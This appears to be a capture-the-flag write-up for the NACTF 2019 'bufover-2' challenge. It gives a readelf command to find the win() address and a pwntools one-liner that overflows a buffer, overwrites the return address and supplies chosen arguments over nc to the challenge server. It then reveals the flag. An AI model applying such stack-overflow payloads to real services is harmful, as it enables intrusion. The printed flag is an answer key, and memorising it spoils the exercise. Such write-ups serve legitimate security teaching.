#### Challenge:

The close cousin of a website for "Question marked as duplicate" - part 3!

Can you control the arguments to `win()` and get the flag? `nc shell.2019.nactf.com 31184` [bufover-2.c](./bufover-2.c ":ignore") [bufover-2](./bufover-2 ":ignore")

---

#### Solution:

```bash
readelf -s ./bufover-2 | grep win
#    60: 080491c2   209 FUNC    GLOBAL DEFAULT   13 win
python -c 'import pwn;  print "A"*28 + pwn.p32(0x080491c2 ) + "A"*4 + pwn.p64(0x14B4DA55) + pwn.p32(0xF00DB4BE )' | nc shell.2019.nactf.com 31184
```

---

<details><summary>FLAG:</summary>

```
nactf{PwN_th3_4rG5_T0o_Ky3v7Ddg}
```

</details>
